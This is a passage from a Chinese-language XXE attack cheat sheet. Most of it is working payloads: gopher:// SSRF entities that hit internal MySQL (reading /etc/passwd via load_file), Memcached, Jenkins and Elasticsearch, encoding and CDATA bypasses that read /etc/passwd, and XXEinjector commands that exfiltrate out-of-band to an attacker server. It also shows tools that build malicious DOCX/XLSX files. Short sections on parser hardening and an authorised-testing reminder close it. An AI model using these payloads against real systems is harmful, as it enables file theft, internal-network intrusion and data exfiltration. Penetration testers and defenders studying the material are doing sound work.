<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "gopher://127.0.0.1:3306/_%61%00%00%00%01%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%2A%00%00%00%03%73%65%6C%65%63%74%20%6C%6F%61%64%5F%66%69%6C%65%28%27%2F%65%74%63%2F%70%61%73%73%77%64%27%29%00">
]>
<root>&xxe;</root>
```

### 10.4 攻击Memcached

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "gopher://127.0.0.1:11211/_%73%65%74%20%66%6F%6F%20%30%20%30%20%35%0D%0A%68%65%6C%6C%6F%0D%0A">
]>
<root>&xxe;</root>
```

### 10.5 攻击内部HTTP服务

**未授权Jenkins：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "gopher://127.0.0.1:8080/_GET%20/script%3F%20HTTP/1.1%0D%0AHost:%20127.0.0.1%0D%0A%0D%0A">
]>
<root>&xxe;</root>
```

**攻击Elasticsearch：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "gopher://127.0.0.1:9200/_GET%20/_cat/indices%20HTTP/1.1%0D%0AHost:%20127.0.0.1%0D%0A%0D%0A">
]>
<root>&xxe;</root>
```

### 10.6 Gopher URL编码辅助生成

**Python生成Gopher payload：**
```python
import urllib.parse

def gopher_encode(host, port, data):
    encoded = urllib.parse.quote(data, safe='')
    return f"gopher://{host}:{port}/_{encoded}"

# 示例：Redis SET命令
redis_cmd = "*3\r\n$3\r\nset\r\n$4\r\ntest\r\n$5\r\nhello\r\n"
print(gopher_encode("127.0.0.1", 6379, redis_cmd))
```

### 10.7 curl生成和测试

```bash
# 测试Gopher payload
gopher://127.0.0.1:6379/_%2A%31%0D%0A%24%34%0D%0APING%0D%0A

# 直接在xxe中使用
curl -g 'gopher://127.0.0.1:6379/_%2A%31%0D%0A%24%34%0D%0APING%0D%0A'
```

---

## 绕过技术汇总

### 实体编码绕过

```xml
<!-- 使用十六进制编码文件名 -->
<!ENTITY xxe SYSTEM "file:///%65%74%63/%70%61%73%73%77%64">
```

### UTF-8 BOM绕过

```xml
﻿<?xml version="1.0" encoding="UTF-8"?>
```

### 字符集绕过

```xml
<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

### 使用CDATA绕过过滤

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % end "]]>">
  <!ENTITY % all "<!ENTITY xxe '%start;%file;%end;'>">
]>
<foo>&xxe;</foo>
```

---

## 工具使用

### XXEinjector

```bash
# 基础文件读取
ruby XXEinjector.rb --host=TARGET --path=/api --file=request.xml

# OOB外带
ruby XXEinjector.rb --host=TARGET --file=request.xml --oob=http://YOUR-SERVER --path=/etc/passwd

# 内网探测
ruby XXEinjector.rb --host=TARGET --file=request.xml --ssrf --host=127.0.0.1 --port=8080
```

### docem（Office XXE）

```bash
# 创建恶意docx
python3 docem.py -s sample.docx -c "file:///etc/passwd" -o output.docx

# 创建恶意xlsx
python3 docem.py -s sample.xlsx -c "file:///etc/passwd" -o output.xlsx
```

### oxml_xxe（Office XXE自动化）

```bash
git clone https://github.com/BuffaloWill/oxml_xxe.git
cd oxml_xxe
python3 oxml_xxe.py -f document.docx -c "file:///etc/passwd" -o output.docx
```

---

## 检测与验证清单

- [ ] 识别所有XML输入点（API、文件上传、SOAP等）
- [ ] 测试基础文件读取（/etc/passwd，win.ini）
- [ ] 测试SSRF内网探测（127.0.0.1:22, 169.254.169.254等）
- [ ] 测试Blind XXE OOB外带
- [ ] 测试XInclude注入
- [ ] 测试SVG/DOCX文件上传
- [ ] 测试PHP伪协议编码读取
- [ ] 测试本地DTD劫持
- [ ] 测试SAML/SOAP等特殊场景
- [ ] 测试Gopher协议内网攻击
- [ ] 测试不同字符编码绕过

---

## 防护措施

### 推荐方案

1. **完全禁用DTD处理**
   ```java
   // Java
   DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
   dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
   dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
   dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
   ```

2. **Python防御配置**
   ```python
   from lxml import etree
   parser = etree.XMLParser(load_dtd=False, no_network=True, resolve_entities=False)
   ```

3. **PHP防御配置**
   ```php
   libxml_disable_entity_loader(true);
   ```

4. **.NET防御配置**
   ```csharp
   XmlReaderSettings settings = new XmlReaderSettings();
   settings.DtdProcessing = DtdProcessing.Prohibit;
   ```

5. **输入验证**
   - 使用白名单验证XML结构
   - 优先使用JSON等非XML格式
   - 对XML进行严格schema验证

---

## 注意事项

- 仅在授权测试环境中进行XXE测试
- OOB外带使用自建服务器，避免数据泄露到第三方
- 注意不同编程语言和库的XXE处理差异
- Gopher协议需PHP支持或目标系统支持gopher:// scheme
- 本地DTD文件路径因操作系统和软件版本而异
- 测试Office文档时的稳定版本可能影响XXE触发
- 某些现代XML解析器默认禁用外部实体，需确认版本
